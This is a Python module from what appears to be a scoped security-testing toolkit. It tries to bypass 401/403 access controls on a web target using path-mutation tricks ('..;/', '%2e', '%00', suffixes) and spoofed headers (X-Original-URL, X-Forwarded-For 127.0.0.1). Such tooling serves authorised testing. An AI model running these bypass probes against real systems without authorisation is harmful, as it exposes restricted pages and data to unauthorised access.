"""403/401 access-control bypass prober (`hk unlock <url>`).

A path that returns 403 or 401 is often still reachable through a parser
discrepancy between the edge proxy and the backend, or a header the backend
trusts. This tries a fixed set of well-known path mutations and header
overrides THROUGH THE SCOPE PROXY (so every request is scope-checked and
rate-limited like any other) and reports only the ones that actually flip the
status to 2xx with a materially different body than the blocked baseline.

It is read-only (GET only) and records nothing itself; the calling phase
decides whether a genuine flip is a lead or a finding. Mutations are the
classic jhaddix path set plus the common header overrides; every variant stays
on the SAME host, so nothing leaves scope.
"""

from __future__ import annotations

from urllib.parse import urlsplit, urlunsplit

from . import webprobe

# Status codes we are trying to get PAST.
_GATED = frozenset({401, 403})
# Status codes that count as "unlocked" if the baseline was gated.
_OPEN = frozenset(range(200, 300))

# Path mutations. {p} is the gated path (with its leading slash). Each produces
# a new path on the same host. Kept deliberately small and high-signal.
_PATH_MUTATIONS = (
    "{p}/",
    "{p}/.",
    "{p}//",
    "/.{p}",
    "{p}%20",
    "{p}%09",
    "{p}%00",
    "{p}?",
    "{p}??",
    "{p}#",
    "{p}/..;/",
    "{p};/",
    "{p};a.css",
    "{p}.json",
    "{p}.css",
)


def _segment_mutations(path: str) -> list[str]:
    """Mutations that act on the LAST path segment: /admin -> /./admin,
    /%2e/admin, /..;/admin, case flip, a fake traversal prefix."""
    path = path or "/"
    if path == "/":
        return []
    head, _, seg = path.rpartition("/")
    head = head or ""
    out = [
        f"{head}/./{seg}",
        f"{head}/%2e/{seg}",
        f"{head}/..;/{seg}",
        f"{head}//{seg}",
        f"{head}/{seg.upper()}",
        f"{head}/{seg.swapcase()}",
        f"{head}/fakepath/..%2f{seg}",
    ]
    return out


# Header overrides tried against the ORIGINAL url.
_HEADER_SETS = (
    {"X-Original-URL": "{p}"},
    {"X-Rewrite-URL": "{p}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Referer": "{base}"},
)


def _with_path(url: str, new_path: str) -> str:
    parts = urlsplit(url)
    return urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))


def _variants(url: str) -> list[tuple[str, str, dict]]:
    """(label, url, headers) variants to try. Path variants carry no extra
    headers; header variants keep the original url."""
    parts = urlsplit(url)
    path = parts.path or "/"
    base = f"{parts.scheme}://{parts.netloc}"
    out: list[tuple[str, str, dict]] = []
    seen: set[tuple[str, str]] = set()

    def add(label: str, u: str, headers: dict) -> None:
        key = (u, tuple(sorted(headers.items())))
        if key not in seen:
            seen.add(key)
            out.append((label, u, headers))

    for tmpl in _PATH_MUTATIONS:
        new_path = tmpl.format(p=path)
        add(f"path {tmpl}", _with_path(url, new_path), {})
    for new_path in _segment_mutations(path):
        add(f"seg {new_path}", _with_path(url, new_path), {})
    for hset in _HEADER_SETS:
        headers = {k: v.format(p=path, base=base) for k, v in hset.items()}
        add("hdr " + ",".join(hset), url, headers)
    return out


def _fetch(opener, url: str, headers: dict) -> dict:
    """webprobe.fetch doesn't take headers, so build a Request when we need
    them; otherwise reuse webprobe.fetch for parity with the rest of the kit."""
    if not headers:
        return webprobe.fetch(opener, url)
    import hashlib
    import urllib.error
    import urllib.request
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with opener.open(req, timeout=20) as resp:
            body = resp.read(20000)
            return {"status": resp.status, "len": len(body),
                    "hash": hashlib.sha256(body).hexdigest()[:16]}
    except urllib.error.HTTPError as exc:
        body = exc.read(20000) if hasattr(exc, "read") else b""
        return {"status": exc.code, "len": len(body),
                "hash": hashlib.sha256(body).hexdigest()[:16],
                "blocked": bool(exc.headers and exc.headers.get("X-Hunter-Blocked"))}
    except Exception as exc:  # noqa: BLE001
        return {"error": str(exc)[:120]}


def probe(url: str, opener) -> dict:
    """Baseline the url, then try every variant. Returns a result dict with the
    baseline and any genuine bypasses (gated baseline -> 2xx, different body)."""
    baseline = webprobe.fetch(opener, url)
    base_status = baseline.get("status")
    result = {"url": url, "baseline": baseline, "bypasses": [], "tried": 0}
    if base_status not in _GATED:
        result["note"] = (f"baseline is {base_status}, not 401/403 - nothing to bypass"
                          if base_status else "baseline did not load")
        return result

    base_hash = baseline.get("hash")
    for label, vurl, headers in _variants(url):
        res = _fetch(opener, vurl, headers)
        result["tried"] += 1
        if res.get("blocked") or "error" in res:
            continue  # proxy-blocked (out of scope) or network error - not a bypass
        status = res.get("status")
        if status in _OPEN and res.get("hash") != base_hash and res.get("len", 0) > 0:
            result["bypasses"].append({
                "how": label, "url": vurl, "headers": headers or None,
                "status": status, "len": res.get("len"),
            })
    return result
